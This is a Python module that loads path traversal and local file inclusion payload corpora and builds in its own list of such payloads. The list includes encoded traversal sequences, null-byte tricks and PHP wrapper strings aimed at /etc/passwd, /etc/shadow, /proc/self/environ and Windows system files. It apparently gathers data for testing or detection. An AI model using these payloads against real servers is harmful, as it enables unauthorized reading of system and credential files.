"""Load and normalize raw path traversal / LFI payload corpora."""
from __future__ import annotations

from pathlib import Path


def normalize_payload(line: str) -> str:
    """Strip whitespace, drop blank lines and pure comments."""
    s = line.strip()
    if not s:
        return ""
    if s.startswith("#"):
        return ""
    return s


def load_payloads_from_file(path: Path) -> list[str]:
    out: list[str] = []
    for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
        p = normalize_payload(line)
        if p:
            out.append(p)
    return out


def load_payloads_from_dir(root: Path) -> list[str]:
    """Recursively load all .txt payloads under root, deduped, order preserved."""
    root = Path(root)
    seen: set[str] = set()
    out: list[str] = []
    files = sorted(root.rglob("*.txt")) if root.is_dir() else []
    for f in files:
        for p in load_payloads_from_file(f):
            if p not in seen:
                seen.add(p)
                out.append(p)
    return out


# Built-in path traversal / LFI payloads for when no external corpus is available.
BUILTIN_PAYLOADS: list[str] = [
    # --- Classic ../ traversal (Unix) ---
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../etc/shadow",
    "../../../etc/hosts",
    # --- Smuggling / filter-bypass sequences ---
    "....//....//....//etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%2fpasswd",
    "..%c0%afetc%2fpasswd",
    # --- Absolute paths (Unix) ---
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/version",
    "/proc/self/cmdline",
    "/proc/self/status",
    "/proc/net/tcp",
    "/var/log/auth.log",
    # --- Windows targets ---
    "C:\\Windows\\win.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..%5c..%5c..%5cWindows%5cwin.ini",
    "....\\....\\....\\Windows\\win.ini",
    # --- PHP wrappers (LFI) ---
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "data://text/plain;base64,SGVsbG8=",
    # --- file:// scheme ---
    "file:///etc/passwd",
    "file:///C:/Windows/win.ini",
    # --- Null byte injection ---
    "../../../../../../etc/passwd%00",
    "../../../etc/passwd%00.html",
    "..%00./..%00./..%00./etc/passwd",
    "/etc/passwd%00",
    # --- Backslash variants ---
    "..\\..\\..\\etc\\passwd",
    "..\\/..\\/..\\/etc/passwd",
    # --- Extra volume / variants ---
    "../../etc/passwd",
    "../etc/passwd",
    "....//....//etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "....//etc/passwd",
    "../../../../../../etc/shadow",
    "../../../../../etc/hosts",
    "../../../../../../proc/self/environ",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
    ".../...//etc/passwd",
    "..;/..;/..;/etc/passwd",
    "..%c0%afetc%2fshadow",
    "/etc/passwd%00.jpg",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
    "..%c0%af..%c0%afetc%2fshadow",
    "..%252fetc%252fpasswd",
    "..%252f..%252fetc%252fpasswd",
    # --- Plain safe filenames (legitimate) ---
    "safe_file.txt",
    "index.php",
    "readme.txt",
]


def load_all_corpora(raw_dir: Path) -> list[str]:
    """Load external corpora if available, plus built-in payloads, deduped."""
    raw_dir = Path(raw_dir)
    seen: set[str] = set()
    out: list[str] = []

    for subdir in ("SecLists", "PayloadsAllTheThings"):
        d = raw_dir / subdir
        if d.is_dir():
            for payload in load_payloads_from_dir(d):
                if payload not in seen:
                    seen.add(payload)
                    out.append(payload)

    for payload in BUILTIN_PAYLOADS:
        if payload not in seen:
            seen.add(payload)
            out.append(payload)

    return out
